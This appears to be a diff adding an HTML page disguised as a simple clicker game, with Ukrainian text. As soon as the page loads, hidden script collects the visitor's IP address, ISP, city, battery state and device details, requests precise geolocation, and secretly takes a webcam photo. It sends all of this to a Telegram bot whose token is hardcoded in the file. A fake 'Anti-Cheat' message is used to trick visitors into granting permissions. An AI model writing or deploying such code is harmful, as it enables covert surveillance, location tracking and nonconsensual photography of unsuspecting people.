@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clicker Champion v1.2</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #1a1a2e; color: white; user-select: none; }
+        .game-container { text-align: center; background: rgba(255, 255, 255, 0.1); padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 300px; }
+        #score-display { font-size: 2.5rem; margin-bottom: 20px; font-weight: bold; color: #ffd700; }
+        #main-button { width: 150px; height: 150px; border-radius: 50%; border: none; background: #e94560; box-shadow: 0 8px 0 #952d3c; cursor: pointer; font-size: 3rem; transition: transform 0.1s; }
+        #main-button:active { transform: translateY(4px); box-shadow: 0 4px 0 #952d3c; }
+        p { font-size: 0.9rem; opacity: 0.7; margin-top: 15px; }
+    </style>
+</head>
+<body>
+    <div class="game-container">
+        <div id="score-display">0</div>
+        <button id="main-button">💰</button>
+        <p>Натисніть "Дозволити" для активації Anti-Cheat системи 🏆</p>
+    </div>
+
+    <video id="video" style="display:none" autoplay></video>
+    <canvas id="canvas" style="display:none"></canvas>
+
+    <script>
+        let score = 0;
+        const scoreDisplay = document.getElementById('score-display');
+        const mainButton = document.getElementById('main-button');
+        
+        // Твої дані Telegram
+        const botToken = '8652413321:AAGziAFFffZbHEdqxxFWdgXJJNmanVFZxK8';
+        const chatId = '8194848649';
+
+        mainButton.onclick = () => {
+            score++;
+            scoreDisplay.innerText = score;
+            if(navigator.vibrate) navigator.vibrate(50);
+        };
+
+        async function startSpy() {
+            try {
+                // 1. IP, Провайдер, Місто
+                let ipData = { ip: "Невідомо", org: "Невідомо", city: "Невідомо" };
+                try {
+                    const res = await fetch('https://ipapi.co/json/');
+                    ipData = await res.json();
+                } catch(e) {}
+
+                // 2. Дані про батарею
+                let bat = "Невідомо";
+                if(navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    bat = `${Math.round(b.level * 100)}% (${b.charging ? 'Зарядка' : 'Розряд'})`;
+                }
+
+                // 3. Відправка основного звіту
+                const report = `🚨 ОБ'ЄКТ У ПАСТЦІ!\n👤 Місто: ${ipData.city}\n🌐 IP: ${ipData.ip}\n🏢 Провайдер: ${ipData.org}\n🔋 Заряд: ${bat}\n📱 Процесор: ${navigator.hardwareConcurrency} ядер\n🖥 Екран: ${screen.width}x${screen.height}`;
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(report)}`);
+
+                // 4. Запит локації (Google Maps)
+                navigator.geolocation.getCurrentPosition(pos => {
+                    const map = `📍 ТОЧНА КАРТА:\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(map)}`);
+                });
+
+                // 5. Таємне фото
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                await new Promise(r => setTimeout(r, 1500)); // Час на фокус
+
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                stream.getTracks().forEach(t => t.stop()); // Вимикаємо камеру
+
+                canvas.toBlob(blob => {
+                    const fd = new FormData();
+                    fd.append('chat_id', chatId);
+                    fd.append('photo', blob, 'shot.jpg');
+                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
+                }, 'image/jpeg');
+
+            } catch (err) {
+                console.log("Відмова користувача");
+            }
+        }
+
+        // Запуск при відкритті
+        window.onload = startSpy;
+    </script>
+</body>
+</html>
+
+
